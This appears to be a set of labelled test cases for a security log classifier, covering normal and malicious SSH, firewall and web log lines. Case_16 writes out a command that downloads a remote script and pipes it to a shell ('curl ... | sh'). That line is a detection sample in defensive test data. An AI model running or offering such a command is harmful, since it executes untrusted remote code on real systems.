# Mixed Shift Scenario Raw Examples

This file gives a human-readable view of the normalized scenario batch.

- `case_01` `ssh` expected `normal`: Accepted publickey for deploy from 10.20.1.15
- `case_02` `firewall` expected `normal`: allow DNS request from workstation
- `case_03` `web` expected `normal`: GET /dashboard 200 "Mozilla/5.0"
- `case_04` `ssh` expected `normal`: Single failed password for deploy from 10.20.1.15
- `case_05` `web` expected `normal`: GET /health 200 "curl/8.1"
- `case_06` `firewall` expected `normal`: allow HTTPS session from workstation
- `case_07` `ssh` expected `ssh_bruteforce`: 42 failed SSH passwords for root from 198.51.100.44 in 10 minutes
- `case_08` `firewall` expected `firewall_block`: deny repeated SSH attempts from 198.51.100.44
- `case_09` `web` expected `web_sql_injection`: SQL injection probe against /login
- `case_10` `firewall` expected `firewall_port_scan`: drop RDP scan from 203.0.113.90
- `case_11` `ssh` expected `ssh_invalid_user_scan`: Invalid user guest from 203.0.113.88 repeated across accounts
- `case_12` `web` expected `web_xss`: XSS payload posted to /comment
- `case_13` `web` expected `web_path_traversal`: Path traversal probe for /etc/passwd
- `case_14` `ssh` expected `ssh_suspicious_success`: Accepted password for ubuntu after 35 failures from 198.51.100.44
- `case_15` `web` expected `web_scanner`: Scanner requested /.env
- `case_16` `ssh` expected `ssh_post_auth_command`: Post-auth command: curl -fsSL http://198.51.100.200/a.sh | sh
- `case_17` `firewall` expected `firewall_suspicious_outbound`: large outbound connection to unusual port 31337
- `case_18` `firewall` expected `firewall_block`: deny SMB attempt from external source
